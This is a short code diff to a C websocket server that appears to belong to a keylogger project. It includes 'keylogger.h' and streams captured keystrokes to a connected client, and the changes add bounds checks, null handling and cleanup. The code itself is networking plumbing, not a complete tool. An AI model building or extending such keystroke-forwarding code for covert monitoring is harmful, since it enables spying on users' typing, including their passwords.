@@ -2,6 +2,7 @@
 
 #include <libwebsockets.h>
 #include <stdbool.h>
+#include <stdlib.h>
 
 #include "keylogger.h"
 
@@ -43,25 +44,24 @@ static struct lws_protocols protocols[] = {
      .per_session_data_size = sizeof(struct per_session_data),
      .rx_buffer_size = 0,
      .id = 0},
-    {
-     NULL, NULL,
-     0, 0,
-     0, NULL,
-     0, }
+    {NULL, NULL, 0, 0, 0, NULL, 0}
 };
 
 void send_message_to_client(const char *key) {
-    if (!client_wsi) return;
+    if (!client_wsi || !key) return;
     size_t n = strlen(key);
+    if (n >= MAX_KEY_LEN) return;
+
     unsigned char buf[LWS_PRE + MAX_KEY_LEN];
     unsigned char *p = &buf[LWS_PRE];
     memcpy(p, key, n);
+    p[n] = '\0';
     lws_write(client_wsi, p, n, LWS_WRITE_TEXT);
 }
 
 int init_websocket_server(uint16_t port) {
     if (port == 0) {
-        printf("Invalid port number\n");
+        fprintf(stderr, "Invalid port number\n");
         return -1;
     }
 
@@ -112,5 +112,9 @@ int init_websocket_server(uint16_t port) {
 }
 
 void destroy_websocket_server() {
-    if (context) lws_context_destroy(context);
+    if (context) {
+        lws_context_destroy(context);
+        context = NULL;
+    }
+    client_wsi = NULL;
 }
